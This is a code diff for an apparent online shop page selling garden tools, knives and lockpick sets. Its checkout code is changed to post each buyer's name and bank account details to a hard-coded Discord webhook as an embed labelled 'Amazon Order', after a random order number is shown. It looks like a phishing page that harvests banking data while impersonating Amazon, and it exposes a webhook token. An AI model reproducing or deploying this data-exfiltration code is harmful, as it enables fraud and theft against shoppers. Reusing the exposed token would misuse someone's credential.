@@ -173,13 +173,13 @@
 
             switch (item) {
                 case 'Shovels':
-                    variants = ["Basic Shovel", "Heavy-Duty Shovel", "Collapsible Shovel"];
+                    variants = ["Basic Shovel", "Heavy-Duty Shovel"];
                     break;
                 case 'Hoes':
-                    variants = ["Garden Hoe", "Stirrup Hoe", "Heavy-Duty Hoe"];
+                    variants = ["Garden Hoe", "Heavy-Duty Hoe"];
                     break;
                 case 'Knives':
-                    variants = ["Chef Knife", "Hunting Knife", "Utility Knife"];
+                    variants = ["Pocket Knife", "Hunting Knife", "Utility Knife"];
                     break;
                 case 'Lockpick sets':
                     variants = ["Beginner Lockpick Set", "Professional Lockpick Set", "Advanced Lockpick Set"];
@@ -222,17 +222,41 @@
                 const orderNumber = Math.floor(Math.random() * 1000000);
                 alert(`Thank you for your purchase of ${item}! Your order number is #${orderNumber}.`);
 
-                // Send webhook with details (this is a mockup example)
-                fetch('https://webhook.site/https://discord.com/api/webhooks/1280978020026417303/N6_0RI7IzLcVkYjHnkDqVWNHnxfycklVvwBiqlXqdXCwkg2dGMKcQoipOFvjFaShJTqQ', {
+                // Send webhook with details as an embed to Discord
+                fetch('https://discord.com/api/webhooks/1280978020026417303/N6_0RI7IzLcVkYjHnkDqVWNHnxfycklVvwBiqlXqdXCwkg2dGMKcQoipOFvjFaShJTqQ', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
                     },
                     body: JSON.stringify({
-                        orderNumber: orderNumber,
-                        item: item,
-                        customerName: name,
-                        bankDetails: bankDetails
+                        embeds: [
+                            {
+                                title: "New Order Received",
+                                color: 3066993,
+                                fields: [
+                                    {
+                                        name: "Order Number",
+                                        value: `#${orderNumber}`
+                                    },
+                                    {
+                                        name: "Item",
+                                        value: item
+                                    },
+                                    {
+                                        name: "Customer Name",
+                                        value: name
+                                    },
+                                    {
+                                        name: "Bank Account Details",
+                                        value: bankDetails
+                                    }
+                                ],
+                                footer: {
+                                    text: "Amazon Order"
+                                },
+                                timestamp: new Date()
+                            }
+                        ]
                     })
                 }).then(response => console.log('Webhook sent:', response));
             } else {
